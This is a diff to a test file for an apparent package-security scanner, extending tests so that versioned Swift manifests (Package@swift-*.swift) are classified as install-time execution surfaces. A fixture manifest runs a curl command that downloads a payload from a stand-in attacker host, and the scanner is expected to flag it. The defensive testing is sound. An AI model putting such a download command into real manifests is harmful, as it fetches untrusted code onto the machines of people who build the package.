@@ -15,7 +15,17 @@ test("a Swift package manifest is an install surface", () => {
   // resolve and build, the same install-time execution setup.py and
   // extconf.rb already classify for. Its name alone decides, wherever
   // in the tree the package root sits.
-  for (const path of ["Package.swift", "pkg/Package.swift"]) {
+  for (const path of [
+    "Package.swift",
+    "pkg/Package.swift",
+    // SE-0135 versioned manifests execute on the matching toolchain,
+    // so every spelling classifies the same way.
+    "Package@swift-5.9.swift",
+    "Package@swift-5.swift",
+    "Package@swift-6.0.3.swift",
+    "package@swift-5.9.swift",
+    "pkg/Package@swift-5.9.swift",
+  ]) {
     expect({ path, surfaces: surfacesOf(path) }).toEqual({
       path,
       surfaces: ["installScripts", "source"],
@@ -40,14 +50,22 @@ test("an install-time download inside Package.swift is recorded as a download", 
   // classification the manifest was source alone, so the same bytes
   // recorded no download and left no gap: a scan could read clean over
   // an install-time fetch SwiftPM would have run while building.
-  const inspection = inspected(
+  // The versioned spelling must behave identically: the same bytes in
+  // Package@swift-5.9.swift are an install-time download too.
+  for (const path of [
     "Package.swift",
-    'import PackageDescription\nimport Foundation\nlet task = Process()\ntask.arguments = ["-c", "curl -fsSL https://evil.example/payload -o /tmp/payload"]\nlet package = Package(name: "Demo")\n',
-  );
-  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
-  expect(inspection.visibilityGaps).toEqual([
-    "Install-time download not retrieved: https://evil.example/payload",
-  ]);
+    "Package@swift-5.9.swift",
+    "pkg/Package@swift-5.9.swift",
+  ]) {
+    const inspection = inspected(
+      path,
+      'import PackageDescription\nimport Foundation\nlet task = Process()\ntask.arguments = ["-c", "curl -fsSL https://evil.example/payload -o /tmp/payload"]\nlet package = Package(name: "Demo")\n',
+    );
+    expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+    expect(inspection.visibilityGaps).toEqual([
+      "Install-time download not retrieved: https://evil.example/payload",
+    ]);
+  }
 });
 
 test("an ordinary Package.swift keeps no finding", () => {
